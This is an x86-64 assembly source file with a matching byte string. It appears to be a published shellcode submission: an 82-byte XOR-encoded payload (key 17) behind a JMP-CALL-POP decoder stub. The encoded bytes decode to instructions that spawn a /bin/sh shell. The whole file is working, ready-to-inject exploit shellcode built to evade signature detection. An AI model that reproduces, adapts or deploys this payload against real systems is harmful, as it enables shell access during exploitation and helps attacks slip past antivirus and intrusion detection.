; Author: Robert C. Raducioiu
; Shellcode: "\xeb\x13\x5b\x48\x89\xde\x31\xc9\x83\xc1\x38\x80\x36\x11\x48\xff\xc6\xe2\xf8\xeb\x05\xe8\xe8\xff\xff\xff\x20\xd1\xfa\x06\x4e\x59\x9c\x66\x19\x59\x9c\x46\x01\x99\x56\x16\x59\x98\x2f\x59\x98\x13\x92\xd1\x2a\x1e\x14\xf9\xf5\xee\xee\xee\x3e\x73\x78\x7f\x3e\x62\x79\x50\x53\x53\x53\x53\x53\x53\x53\x53\x52\x52\x52\x52\x52\x52\x52\x52";
; Shellcode length: 82 bytes

global _start

section .text

_start:

    jmp short CallDecodeShellcode

DecodeShellcode:

    ; get the address of shellcode using the JMP-CALL-POP technique
    pop rbx
    mov rsi, rbx

    ; set RCX to 56, which is the length of the encrypter shellcode
    xor ecx, ecx
    add ecx, 56

DecodeByte:

    ; xor each byte of the encrypter shellcode with the key, which in this case is hard-coded
    xor BYTE [rsi], 17

    ; increase the address pointing to the next byte to decrypt
    inc rsi

    ; call DecodeByte N times, where N is the length of the encrypter shellcode
    loop DecodeByte

    ; once decrypted, execute the shellcode
    jmp short shellcode

CallDecodeShellcode:

    call DecodeShellcode
    shellcode: db 0x20,0xd1,0xfa,0x06,0x4e,0x59,0x9c,0x66,0x19,0x59,0x9c,0x46,0x01,0x99,0x56,0x16,0x59,0x98,0x2f,0x59,0x98,0x13,0x92,0xd1,0x2a,0x1e,0x14,0xf9,0xf5,0xee,0xee,0xee,0x3e,0x73,0x78,0x7f,0x3e,0x62,0x79,0x50,0x53,0x53,0x53,0x53,0x53,0x53,0x53,0x53,0x52,0x52,0x52,0x52,0x52,0x52,0x52,0x52
